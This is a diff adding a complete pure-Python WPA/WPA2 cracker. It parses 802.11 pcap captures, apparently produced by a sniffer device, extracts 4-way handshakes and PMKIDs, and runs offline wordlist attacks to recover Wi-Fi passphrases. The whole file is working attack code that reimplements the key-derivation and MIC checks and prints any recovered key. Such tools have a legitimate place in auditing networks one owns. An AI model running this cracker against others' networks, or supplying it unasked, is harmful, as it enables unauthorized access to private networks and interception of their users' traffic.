@@ -1,0 +1,346 @@
+#!/usr/bin/env python3
+"""WPA/WPA2 4-way-handshake (and PMKID) dictionary cracker — pure Python.
+
+Reads a libpcap file with raw 802.11 frames (DLT_IEEE802_11 = 105, what the
+device's sniffer writes to /BrucePCAP/handshakes/*.pcap; radiotap DLT 127 is
+also accepted), extracts any WPA handshakes / PMKIDs, and runs a wordlist
+attack offline.
+
+Crypto (all stdlib hashlib + `cryptography` for AES-CMAC):
+  PMK  = PBKDF2-HMAC-SHA1(passphrase, ssid, 4096, 32)
+  PTK  = PRF-512(PMK, "Pairwise key expansion", min|max(AA,SPA)+min|max(ANonce,SNonce))
+  KCK  = PTK[0:16]
+  MIC  = { v1: HMAC-MD5 | v2: HMAC-SHA1-128 | v3: AES-128-CMAC }(KCK, eapol_frame_mic_zeroed)
+  PMKID = HMAC-SHA1-128(PMK, "PMK Name" + AA + SPA)
+
+  host/.venv/bin/python host/wpa_crack.py capture.pcap -w wordlist.txt [--ssid NAME]
+"""
+import hashlib
+import hmac
+import struct
+import sys
+from dataclasses import dataclass, field
+
+try:
+    from cryptography.hazmat.primitives.cmac import CMAC
+    from cryptography.hazmat.primitives.ciphers import algorithms
+    _HAVE_CMAC = True
+except Exception:  # noqa: BLE001
+    _HAVE_CMAC = False
+
+EAPOL_LLC = bytes.fromhex("aaaa03000000888e")  # LLC/SNAP for 802.1X/EAPOL
+
+
+# ── crypto ───────────────────────────────────────────────────────────────────
+def pmk(passphrase: str, ssid: str) -> bytes:
+    return hashlib.pbkdf2_hmac("sha1", passphrase.encode(), ssid.encode(), 4096, 32)
+
+
+def _prf512(key: bytes, label: bytes, data: bytes) -> bytes:
+    """IEEE 802.11 PRF-512 (HMAC-SHA1) — produces the 64-byte PTK; we use 48."""
+    out = b""
+    i = 0
+    while len(out) < 64:
+        out += hmac.new(key, label + b"\x00" + data + bytes([i]), hashlib.sha1).digest()
+        i += 1
+    return out[:64]
+
+
+def ptk(pmk_: bytes, aa: bytes, spa: bytes, anonce: bytes, snonce: bytes) -> bytes:
+    data = min(aa, spa) + max(aa, spa) + min(anonce, snonce) + max(anonce, snonce)
+    return _prf512(pmk_, b"Pairwise key expansion", data)
+
+
+def mic(kck: bytes, eapol: bytes, key_version: int) -> bytes:
+    if key_version == 1:
+        return hmac.new(kck, eapol, hashlib.md5).digest()[:16]
+    if key_version == 2:
+        return hmac.new(kck, eapol, hashlib.sha1).digest()[:16]
+    if key_version == 3:
+        if not _HAVE_CMAC:
+            raise RuntimeError("AES-CMAC (key version 3) needs the 'cryptography' package")
+        c = CMAC(algorithms.AES(kck))
+        c.update(eapol)
+        return c.finalize()[:16]
+    raise ValueError(f"unsupported key descriptor version {key_version}")
+
+
+def pmkid(pmk_: bytes, aa: bytes, spa: bytes) -> bytes:
+    return hmac.new(pmk_, b"PMK Name" + aa + spa, hashlib.sha1).digest()[:16]
+
+
+# ── handshake model ────────────────────────────────────────────────────────────
+@dataclass
+class Handshake:
+    ssid: str = ""
+    ap: bytes = b""          # AA  (BSSID / authenticator)
+    sta: bytes = b""         # SPA (supplicant)
+    anonce: bytes = b""
+    snonce: bytes = b""
+    key_version: int = 2
+    eapol: bytes = b""       # the MIC-bearing EAPOL frame, MIC field zeroed
+    captured_mic: bytes = b""
+    pmkid: bytes = b""       # set if a PMKID KDE was seen (msg1)
+    msgs: set = field(default_factory=set)
+
+    def crackable(self) -> bool:
+        if self.pmkid and self.ssid:
+            return True
+        return bool(self.ssid and self.anonce and self.snonce
+                    and self.eapol and self.captured_mic)
+
+    def verify(self, passphrase: str) -> bool:
+        if not (8 <= len(passphrase) <= 63):
+            return False
+        p = pmk(passphrase, self.ssid)
+        if self.pmkid:
+            if pmkid(p, self.ap, self.sta) == self.pmkid:
+                return True
+            if not self.crackable() or not self.eapol:
+                return False
+        t = ptk(p, self.ap, self.sta, self.anonce, self.snonce)
+        return mic(t[:16], self.eapol, self.key_version) == self.captured_mic
+
+    def label(self) -> str:
+        ap = self.ap.hex(":") if self.ap else "?"
+        kind = "PMKID" if self.pmkid and not self.captured_mic else "EAPOL"
+        return f"{self.ssid or '<unknown>'} [{ap}] {kind} msgs={sorted(self.msgs)}"
+
+
+# ── pcap + 802.11 + EAPOL parsing ──────────────────────────────────────────────
+def read_pcap(path: str):
+    """Yield raw link-layer frames (802.11 MAC frames). Handles DLT 105 (raw
+    802.11) and 127 (radiotap — header stripped)."""
+    with open(path, "rb") as fh:
+        gh = fh.read(24)
+        if len(gh) < 24:
+            return
+        magic = gh[:4]
+        if magic in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4"):
+            le = magic == b"\xd4\xc3\xb2\xa1"
+        else:
+            raise ValueError("not a libpcap file (bad magic) — pcapng is unsupported")
+        end = "<" if le else ">"
+        dlt = struct.unpack(end + "I", gh[20:24])[0]
+        while True:
+            rh = fh.read(16)
+            if len(rh) < 16:
+                return
+            _, _, incl, _orig = struct.unpack(end + "IIII", rh)
+            data = fh.read(incl)
+            if len(data) < incl:
+                return
+            if dlt == 127:  # radiotap: it_len is u16 LE at offset 2
+                if len(data) < 4:
+                    continue
+                itlen = struct.unpack("<H", data[2:4])[0]
+                data = data[itlen:]
+            yield data
+
+
+def _mac(b: bytes) -> bytes:
+    return bytes(b)
+
+
+def parse(path: str):
+    """Parse a pcap into {(ap,sta): Handshake} keyed handshakes, filling SSIDs
+    from beacons/probe-responses."""
+    ssids = {}                       # bssid -> ssid
+    hs = {}                          # (ap, sta) -> Handshake
+
+    def get_hs(ap, sta):
+        k = (ap, sta)
+        if k not in hs:
+            hs[k] = Handshake(ap=ap, sta=sta)
+        return hs[k]
+
+    for fr in read_pcap(path):
+        if len(fr) < 24:
+            continue
+        fc = fr[0] | (fr[1] << 8)
+        ftype = (fc >> 2) & 3
+        subtype = (fc >> 4) & 0xF
+        tods = (fc >> 8) & 1
+        fromds = (fc >> 9) & 1
+        addr1, addr2, addr3 = _mac(fr[4:10]), _mac(fr[10:16]), _mac(fr[16:22])
+
+        # management beacon (8) / probe response (5): grab SSID for the BSSID
+        if ftype == 0 and subtype in (8, 5):
+            bssid = addr3
+            body = fr[24 + 12:]  # skip mgmt header + (timestamp8 interval2 caps2)
+            i = 0
+            while i + 2 <= len(body):
+                tag, tlen = body[i], body[i + 1]
+                if tag == 0 and i + 2 + tlen <= len(body):
+                    try:
+                        s = body[i + 2:i + 2 + tlen].decode("utf-8", "replace")
+                    except Exception:  # noqa: BLE001
+                        s = ""
+                    if s:
+                        ssids[bssid] = s
+                    break
+                i += 2 + tlen
+            continue
+
+        # data frames only for EAPOL
+        if ftype != 2:
+            continue
+        off = 24
+        if subtype & 0x08:  # QoS data has a 2-byte QoS Control field
+            off += 2
+        if fromds and tods:  # WDS has a 4th address — rare; skip
+            off += 6
+        if len(fr) < off + 8 or fr[off:off + 8] != EAPOL_LLC:
+            continue
+        # direction → AP (authenticator) / STA (supplicant)
+        if tods and not fromds:        # STA -> AP
+            ap, sta = addr1, addr2
+        elif fromds and not tods:      # AP -> STA
+            ap, sta = addr2, addr1
+        else:
+            ap, sta = addr3, addr2
+
+        e = fr[off + 8:]               # EAPOL frame starts here
+        if len(e) < 4 or e[1] != 3:    # type 3 = EAPOL-Key
+            continue
+        eapol_len = struct.unpack(">H", e[2:4])[0]
+        frame = e[:4 + eapol_len]
+        if len(frame) < 95:
+            continue
+        key_info = struct.unpack(">H", frame[5:7])[0]
+        key_ver = key_info & 0x7
+        pairwise = (key_info >> 3) & 1
+        install = (key_info >> 6) & 1
+        ack = (key_info >> 7) & 1
+        mic_set = (key_info >> 8) & 1
+        if not pairwise:
+            continue
+        nonce = frame[17:49]
+        captured_mic = frame[81:97]
+        key_data_len = struct.unpack(">H", frame[97:99])[0]
+        key_data = frame[99:99 + key_data_len]
+
+        h = get_hs(ap, sta)
+        # classify
+        if ack and not mic_set:        # msg1 (AP→STA): ANonce, maybe PMKID KDE
+            h.anonce = nonce
+            h.msgs.add(1)
+            pid = _extract_pmkid(key_data)
+            if pid:
+                h.pmkid = pid
+        elif mic_set and not ack:      # msg2 (STA→AP): SNonce + MIC; or msg4
+            if int.from_bytes(nonce, "big") != 0:
+                h.snonce = nonce
+                h.msgs.add(2)
+                # zero the MIC field for verification
+                z = bytearray(frame)
+                z[81:97] = b"\x00" * 16
+                h.eapol = bytes(z)
+                h.captured_mic = captured_mic
+                h.key_version = key_ver
+            else:
+                h.msgs.add(4)
+        elif mic_set and ack and install:  # msg3 (AP→STA): ANonce again
+            h.anonce = nonce
+            h.msgs.add(3)
+        h.ssid = ssids.get(ap, h.ssid)
+
+    return ssids, list(hs.values())
+
+
+def _extract_pmkid(key_data: bytes):
+    """Find a PMKID KDE inside msg1 key-data (RSN, OUI 00-0F-AC type 04)."""
+    i = 0
+    while i + 2 <= len(key_data):
+        if key_data[i] == 0xDD:  # vendor-specific IE
+            ln = key_data[i + 1]
+            ie = key_data[i + 2:i + 2 + ln]
+            if len(ie) >= 4 and ie[:4] == bytes.fromhex("000fac04") and len(ie) >= 20:
+                pid = ie[4:20]
+                if pid != b"\x00" * 16:
+                    return pid
+            i += 2 + ln
+        else:
+            i += 1
+    return None
+
+
+# ── cracking ────────────────────────────────────────────────────────────────
+def crack(hsk: Handshake, words, progress=None):
+    """Try each passphrase in `words` (iterable of str). Returns the passphrase
+    or None. Calls progress(n) every 500 tries if given."""
+    n = 0
+    for w in words:
+        w = w.rstrip("\r\n")
+        n += 1
+        if progress and n % 500 == 0:
+            progress(n)
+        try:
+            if hsk.verify(w):
+                return w
+        except Exception:  # noqa: BLE001
+            continue
+    return None
+
+
+def crack_file(pcap_path: str, wordlist_path: str, ssid_override: str = "", progress=None):
+    """High-level: parse a pcap, pick the best crackable handshake, run the
+    wordlist. Returns dict(ok, key, handshake-label, tried, candidates)."""
+    _ssids, hss = parse(pcap_path)
+    if ssid_override:
+        for h in hss:
+            h.ssid = ssid_override
+    crackable = [h for h in hss if h.crackable()]
+    if not crackable:
+        return {"ok": False, "key": None, "error": "no crackable handshake/PMKID found",
+                "candidates": [h.label() for h in hss]}
+    # prefer a full EAPOL handshake over PMKID-only
+    crackable.sort(key=lambda h: (bool(h.captured_mic), bool(h.anonce and h.snonce)), reverse=True)
+    target = crackable[0]
+    tried = [0]
+
+    def words():
+        with open(wordlist_path, "r", errors="ignore") as fh:
+            for line in fh:
+                tried[0] += 1
+                yield line
+
+    key = crack(target, words(), progress)
+    return {"ok": key is not None, "key": key, "handshake": target.label(),
+            "tried": tried[0], "candidates": [h.label() for h in crackable]}
+
+
+def main(argv=None):
+    import argparse
+    ap = argparse.ArgumentParser(description="WPA/WPA2 handshake/PMKID dictionary cracker")
+    ap.add_argument("pcap", help="libpcap file with 802.11 frames (DLT 105 or radiotap)")
+    ap.add_argument("-w", "--wordlist", required=True)
+    ap.add_argument("--ssid", default="", help="override/supply the SSID (if no beacon captured)")
+    ap.add_argument("--list", action="store_true", help="only list handshakes found, don't crack")
+    args = ap.parse_args(argv)
+
+    ssids, hss = parse(args.pcap)
+    print(f"SSIDs seen: {', '.join(sorted(set(ssids.values()))) or '(none)'}")
+    print(f"handshakes: {len(hss)}")
+    for h in hss:
+        if args.ssid:
+            h.ssid = args.ssid
+        print(f"  - {h.label()}  crackable={h.crackable()}")
+    if args.list:
+        return 0
+
+    def prog(n):
+        print(f"  …tried {n}", end="\r", file=sys.stderr)
+
+    res = crack_file(args.pcap, args.wordlist, args.ssid, prog)
+    print()
+    if res["ok"]:
+        print(f"\n[KEY FOUND] {res['handshake']}\n  passphrase: {res['key']}  (after {res['tried']} tries)")
+        return 0
+    print(f"\n[not found] {res.get('error', 'exhausted wordlist')} "
+          f"(tried {res.get('tried', 0)})")
+    return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
